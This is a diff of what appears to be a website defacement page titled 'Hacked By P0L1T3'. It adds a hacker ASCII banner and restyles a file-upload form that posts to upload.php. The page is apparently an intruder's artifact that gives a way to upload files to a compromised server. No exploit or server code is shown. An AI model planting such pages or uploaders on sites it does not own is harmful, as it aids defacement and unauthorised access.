@@ -1,5 +1,16 @@
 
 
+   _______    ______    ___        ____  ___________  _______  
+  |   __ "\  /    " \  |"  |      /  " \("     _   ")/" __   ) 
+  (. |__) :)// ____  \ ||  |     /__|| | )__/  \\__/(__/ _) ./ 
+  |:  ____//  /    ) :)|:  |        |: |    \\_ /       /  //  
+  (|  /   (: (____/ //  \  |___    _\  |    |.  |    __ \_ \\  
+ /|__/ \   \        /  ( \_|:  \  /" \_|\   \:  |   (: \__) :\ 
+(_______)   \"_____/    \_______)(_______)   \__|    \_______) 
+					[BD HACKER]                                                              
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -10,11 +21,13 @@
 	<title>!!Hacked By P0L1T3!!</title>
 </head>
 
-<body style="padding: 0; margin: 0; background-color: #000000; color: #ffffff;">
-<form action="upload.php" method="post" enctype="multipart/form-data">
-  Select image to upload:
-  <input type="file" name="fileToUpload" id="fileToUpload">
-  <input type="submit" value="Upload" name="submit">
+<body style="padding: 0; margin: 0; background-color: #000000; color: #000000; text-align: center; ">
+<form action="upload.php" method="post" enctype="multipart/form-data" style="background-color: rgb(255, 255, 255); padding: 20px; border: 3px dashed rgb(255, 0, 0)" >
+  <div style=" border: 1px dashed rgb(255, 0, 0); padding: 10px;">
+    <i>Select <u><b>files</b></u> to upload:</i>
+    <input type="file" name="fileToUpload" id="fileToUpload">
+    <input type="submit" value="Upload" name="submit" style="background-color: transparent;  border: 2px solid #000000; border-radius: 20px;  color: #000000;  padding: 8px 16px;  text-decoration: none;  cursor: pointer;">
+  </div>
 </form>
 
 </body>
